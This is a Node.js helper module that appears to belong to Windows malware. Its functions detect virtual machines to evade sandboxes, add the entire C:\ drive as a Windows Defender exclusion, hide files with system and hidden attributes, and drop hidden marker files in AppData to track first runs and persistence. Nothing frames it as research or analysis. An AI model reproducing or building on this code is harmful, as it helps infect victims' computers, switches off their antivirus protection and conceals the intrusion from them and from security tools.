const childprocess = require('child_process');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const config = require('../config');

function execClear(command) {
    let res;
    try {
        res = childprocess.execSync(command);
    } catch (e) {
        res = "";
    }
    return res.toString("utf-8").replace(/\n/gm, "").replace(/\r/gm, "").replace(/ /gm, "").toLowerCase();
}

function inVm() {
    if (execClear(`powershell -c "Get-WmiObject -Query \\"Select * from Win32_CacheMemory\\""`) == "") {
        return true;
    }

    return false;
}

function disableDefender() {
    try {
        childprocess.execSync(`powershell -Command "Set-MpPreference -ExclusionPath C:\\ "`)
    } catch (e) {}
}

function hideFile(filePath) {
    try {
        childprocess.execSync(`powershell -Command "attrib +h +s \\"${filePath}\\""`)
    } catch (e) { }
}

function randomString(length) {
    return crypto.randomBytes(Math.round(length/2)).toString('hex');
}

function firstRun() {
    const checkPath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `FRUN${config.id}`);
    if (fs.existsSync(checkPath)) {
        return false;
    } else {
        createDirectoryRecursively(checkPath);
        fs.writeFileSync(checkPath, "");
        hideFile(checkPath);
        return true;
    }
}

function setPersistence() {
    const checkPath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `PERSISTENCE${config.id}`);
    if (fs.existsSync(checkPath)) {
        return false;
    } else {
        createDirectoryRecursively(checkPath);
        fs.writeFileSync(checkPath, "");
        hideFile(checkPath);
        return true;
    }
}

function createDirectoryRecursively(basePath) {
    let folders = basePath.split(path.sep);
    for (let i = 0; i < folders.length; i++) {
        const folder = folders.slice(0, i);

        try {
            fs.mkdir(folder.join(path.sep));
        } catch (e) { }
    }
}

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

module.exports = {
    execClear,
    inVm,
    disableDefender,
    hideFile,
    randomString,
    firstRun,
    setPersistence,
    createDirectoryRecursively,
    sleep
}